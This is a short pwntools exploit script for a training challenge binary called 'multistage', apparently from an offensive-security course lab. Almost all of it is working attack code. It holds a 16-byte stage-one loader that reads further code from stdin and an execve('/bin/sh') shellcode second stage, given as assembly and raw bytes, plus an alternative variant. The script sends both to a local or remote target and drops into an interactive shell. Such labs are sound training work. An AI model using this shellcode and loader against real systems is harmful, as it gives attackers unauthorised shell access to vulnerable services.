from pwn import *

COMMANDS = """
xuntil 0x40123f
"""

s1 = """
xor eax, eax
xor edi, edi
mov rsi, rsp
mov dx, 0x1d
syscall
jmp rsi
"""

s2 = """
mov rax, 0x0068732f6e69622f
push rax
mov rax, 0x3b
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
syscall
"""
# First stage: 16-byte loader that reads more shellcode from stdin
#stage1 = b"\xe8\x00\x00\x00\x00\x5e\x31\xc0\x31\xff\x66\xba\x1d\x00\x0f\x05"
stage1 =  b"\xE8\x00\x00\x00\x00\x5E\x31\xC0\x31\xFF\x66\xBA\x1D\x00\x0F\x05"

# Second stage: execve("/bin/sh", 0, 0) shellcode (23 bytes)
stage2 = b"\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x48\xC7\xC0\x3B\x00\x00\x00\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x0F\x05"

# Alternative second stage (21 bytes) if you prefer:
# stage2 = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x0f\x05"

if args.GDB:
    p = gdb.debug("./multistage", gdbscript=COMMANDS)
elif args.REMOTE:
    p = remote("multistage.training.offensivedefensive.it", 8080, ssl=True)
else:
    p = process("./multistage")

# Send first stage loader (exactly 16 bytes)
p.send(stage1)

# Send second stage execve shellcode
p.send(stage2)

p.interactive()

#execve("/bin/sh\0", NULL, NULL)
#0x0068732f6e69622f

